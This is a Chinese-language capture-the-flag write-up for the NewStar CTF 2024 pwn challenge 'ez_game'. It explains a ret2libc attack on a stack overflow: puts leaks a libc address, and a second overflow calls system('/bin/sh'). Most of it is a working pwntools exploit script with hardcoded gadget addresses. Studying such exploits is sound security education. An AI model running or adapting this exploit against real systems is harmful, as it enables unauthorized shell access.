# ez_game

> 分类：Pwn

## 题目描述
明显的栈溢出且没有后门函数。checksec 检查后没有开启 PIE，直接打 ret2libc（需要栈对齐）。

## 考察知识点
- 栈溢出
- ret2libc
- puts 泄露 libc 基址
- 栈对齐

## 解法
1. 先通过 puts 泄露出 puts 地址，通过 puts 地址与 libc 基地址的偏移得到 libc 基地址，并返回 `main` 函数进行第二次溢出，实现 getshell
2. 构建 `system("/bin/sh")` 取 shell

提示：可以用 ret 地址进行栈对齐。

EXP：

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

ifremote = 0
if ifremote == 1:
    io = remote('0.0.0.0', 9999)
else:
    io = process('./attachment')

elf = ELF('./attachment')
libc = elf.libc

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
ret_addr = 0x0000000000400509

payload = b'a'*0x58+p64(0x0000000000400783)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.recvuntil(b'Welcome to NewStarCTF!!!!\n')
io.sendline(payload)
io.recvuntil(b'\x0a')
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print("puts_addr======================>", hex(puts_addr))

libc_base = puts_addr-libc.sym['puts']
system_addr = libc_base+libc.sym['system']
bin_sh_addr = libc_base+0x1b45bd

payload = b'a'*0x58+p64(0x0000000000400783)+p64(bin_sh_addr)+p64(ret_addr)+p64(system_addr)
io.recvuntil(b'Welcome to NewStarCTF!!!!\n')
io.send(payload)

io.interactive()
```

## 参考答案
flag 未在 writeup 中给出（getshell 后读取）。

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/pwn/ez-game.html
